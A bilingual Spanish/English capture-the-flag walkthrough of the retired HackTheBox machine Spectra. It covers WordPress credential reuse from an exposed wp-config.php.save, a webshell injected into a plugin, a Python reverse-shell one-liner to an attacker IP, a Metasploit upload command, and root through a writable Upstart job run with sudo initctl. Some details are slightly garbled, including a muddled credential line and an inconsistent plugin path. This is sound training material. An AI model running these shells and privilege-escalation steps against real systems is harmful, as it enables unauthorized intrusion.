# Spectra [Easy]

> **ES:** Máquina Linux Easy con WordPress 5.4.2 y dir `/testing` que expone `wp-config.php.save`; login reutilizado, shell vía plugin y root con `initctl` (Upstart job).
> **EN:** Easy Linux box with WordPress 5.4.2 and a `/testing` dir exposing `wp-config.php.save`; reused login, shell via plugin, and root with `initctl` (Upstart job).

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Spectra] |
| **URL** | https://app.hackthebox.com/machines/Spectra |
| **IP lab** | 10.10.10.229 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía WordPress (credencial reutilizada + plugin webshell) → `katie` (autologin) → job Upstart malicioso con `sudo /sbin/initctl`.
> **EN:** Get `user.txt` and `root.txt` via WordPress (reused credential + plugin webshell) → `katie` (autologin) → malicious Upstart job with `sudo /sbin/initctl`.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] wpscan (versión 5.4.2, tema twentytwenty)
- [ ] dirsearch / ffuf (`/main/ /testing/`)
- [ ] curl (lectura `wp-config.php.save`)
- [ ] Metasploit `wp_admin_shell_upload` (o edición manual de plugin)
- [ ] mysql (MySQL remoto denegado)
- [ ] ssh / sudo -l (initctl)

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Puertos 22, 80 (nginx 1.17.4) y 3306 (MySQL rechaza hosts externos). La raíz enlaza a `/main/` (WordPress) y `/testing/` (listado de directorio); añadir `spectra.htb` a hosts.
> **EN:** Ports 22, 80 (nginx 1.17.4) and 3306 (MySQL rejects external hosts). Root links to `/main/` (WordPress) and `/testing/` (directory listing); add `spectra.htb` to hosts.

```bash
nmap -sC -sV -p- -oN nmap_init 10.10.10.229
echo '10.10.10.229 spectra.htb' | sudo tee -a /etc/hosts
mysql -h 10.10.10.229  # ERROR 1130: Host ... is not allowed to connect
```

**Resultado / Result:** WordPress en `/main/`, directorio listado en `/testing/`. Captura del listado en `images/`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** `wpscan` confirma WP 5.4.2 (tema twentytwenty, XML-RPC activo). En `/testing/` hay `wp-config.php.save` legible (emergencia de nano): contiene `devtest : devteam01` (DB `dev`). Esa clave no entra en MySQL remoto ni como `devtest` en WP, pero reutilizada como `administrator : devteam01` en `wp-login.php` sí abre el dashboard (autor visible en la web: `administrator`).
> **EN:** `wpscan` confirms WP 5.4.2 (twentytwenty theme, XML-RPC enabled). `/testing/` has a readable `wp-config.php.save` (nano emergency file): it holds `devtest : devtest01`-style `devtest:devteam01` (DB `dev`). That password fails on remote MySQL and as `devtest` in WP, but reused as `administrator : devteam01` at `wp-login.php` opens the dashboard (author visible on the site: `administrator`).

```bash
wpscan --url http://spectra.htb/main/ --enumerate u,p
# WP 5.4.2, theme twentytwenty, xmlrpc enabled, plugins: Akismet 4.1.5, Hello Dolly 1.7.2
curl -s http://spectra.htb/testing/wp-config.php.save
# define('DB_NAME','dev'); define('DB_USER','devtest'); define('DB_PASSWORD','devteam01');
```

**Resultado / Result:** Login válido al admin de WordPress (`administrator:devteam01`, credencial de laboratorio retirado). Capturas del login en `images/` y en `img/image_20240323-142344.png`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** La edición de temas está bloqueada (falla al guardar `404.php`), pero el editor de plugins sí permite inyectar webshell en `akismet.php` condicionada a un parámetro (o subir plugin/ZIP manual, o módulo `wp_admin_shell_upload`) → shell como `nginx`. No hay `nc` en el host: reverse por Python.
> **EN:** Theme editing is blocked (saving `404.php` fails), but the plugin editor allows injecting a webshell into `akismet.php` gated by a parameter (or manual plugin/ZIP upload, or `wp_admin_shell_upload` module) → shell as `nginx`. No `nc` on the host: Python reverse shell.

```bash
# en Plugin Editor (akismet.php), anteponer webshell condicionada a ?0xdf=
curl 'http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?0xdf=id'
# reverse (python, sin nc):
curl http://spectra.htb/main/wp-content/plugins/wither/wither.php --data-urlencode "0xdf=python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<TU-IP>\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
# alternativa metasploit:
msfconsole -q -x "use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS 10.10.10.229; set TARGETURI /main; set USERNAME administrator; set PASSWORD devteam01; set LHOST <TU-IP>; exploit"
python3 -c 'import pty; pty.spawn("bash")'
whoami  # nginx (host spectra)
```

**Resultado / Result:** Shell web como `nginx`. Capturas del editor en `images/`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** El sistema es Chromium OS (`/etc/lsb-release`, homes `chronos/katie/nginx/root/user`). En `/etc/autologin/passwd` hay password en claro `SummerHereWeCome!!` (ver `/opt/autologin.conf.orig`); corresponde a `katie` (`/home/katie`, shell bash) → SSH y lectura de `user.txt`. El `wp-config.php` real (`dev:development01`, hash phpass `$P$B…` de administrator) es rabbit hole.
> **EN:** The system is Chromium OS (`/etc/lsb-release`, homes `chronos/katie/nginx/root/user`). `/etc/autologin/passwd` holds cleartext `SummerHereWeCome!!` (see `/opt/autologin.conf.orig`); it belongs to `katie` (`/home/katie`, bash shell) → SSH and read `user.txt`. The real `wp-config.php` (`dev:development01`, phpass `$P$B…` hash of administrator) is a rabbit hole.

```bash
cat /etc/lsb-release  # Chromium OS / CHROMEOS_RELEASE_*
cat /etc/autologin/passwd  # SummerHereWeCome!! (credencial de laboratorio retirado)
grep katie /etc/passwd  # katie:x:20156:20157::/home/katie:/bin/bash
ssh katie@spectra.htb
cat /home/katie/user.txt  # formato: e89d... (ofuscado)
sudo -l  # (ALL) SETENV: NOPASSWD: /sbin/initctl
```

**Resultado / Result:** SSH como `katie` → `user.txt`. `katie` puede correr `(ALL) SETENV: NOPASSWD: /sbin/initctl`.

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `initctl` (Upstart) ejecuta jobs de `/etc/init/*.conf` como root; el job de pruebas `test`/`test.conf` (servidor node de `katie`, con `/srv/nodetest.js` en 8081) es escribible. Se reescribe su bloque `script` con `chmod +s /bin/bash`, se arranca con `sudo /sbin/initctl start test` y `/bin/bash -p` es root.
> **EN:** `initctl` (Upstart) runs jobs from `/etc/init/*.conf` as root; the `test`/`test.conf` test job (`katie`'s node server, `/srv/nodetest.js` on 8081) is writable. Rewrite its `script` block with `chmod +s /bin/bash`, start it with `sudo /sbin/initctl start test`, and `/bin/bash -p` is root.

```bash
sudo -l  # (ALL) SETENV: NOPASSWD: /sbin/initctl
sudo /sbin/initctl list  # ... test stop/waiting ...
cat /etc/init/test.conf  # job "Test node.js server" de katie (escribible)
# reescribir el bloque script:
# script
#         chmod +s /bin/bash
# end script
sudo /sbin/initctl start test  # test start/running, process 5172
ls -lh /bin/bash  # -rwsr-sr-x 1 root root
/bin/bash -p
whoami  # root
cat /root/root.txt  # formato parcial ofuscado
```

**Resultado / Result:** Root vía job Upstart malicioso (`/etc/init/test.conf` → SUID en bash). Técnica: abuso de `initctl` con sudo NOPASSWD. Capturas en `images/`.

---

## 🧠 Lo aprendido / Learned

> **ES:** Backups con extensión `.save` servidos en claro; reutilización DB→admin; webshell vía plugins WP (temas bloqueados); Chromium OS/autologin como fuente de creds; privesc con jobs Upstart escribibles + `SETENV` NOPASSWD.
> **EN:** Backups with `.save` extension served in clear; DB→admin reuse; webshell via WP plugins (themes blocked); Chromium OS/autologin as cred source; privesc with writable Upstart jobs + NOPASSWD `SETENV`.

- [ ] `wpscan` + revisión manual de `/testing/` (`.save`)
- [ ] `wp_admin_shell_upload` / edición de plugin
- [ ] `sudo (ALL) SETENV: NOPASSWD: /sbin/initctl` + job malicioso

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: nano `.save`, Chromium OS, `autologin.conf.orig`, job `test`) — wither/nota migrada
- **Referencia técnica:** GTFOBins — init (privesc sudo) — https://gtfobins.github.io/gtfobins/init/ — GTFOBins
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
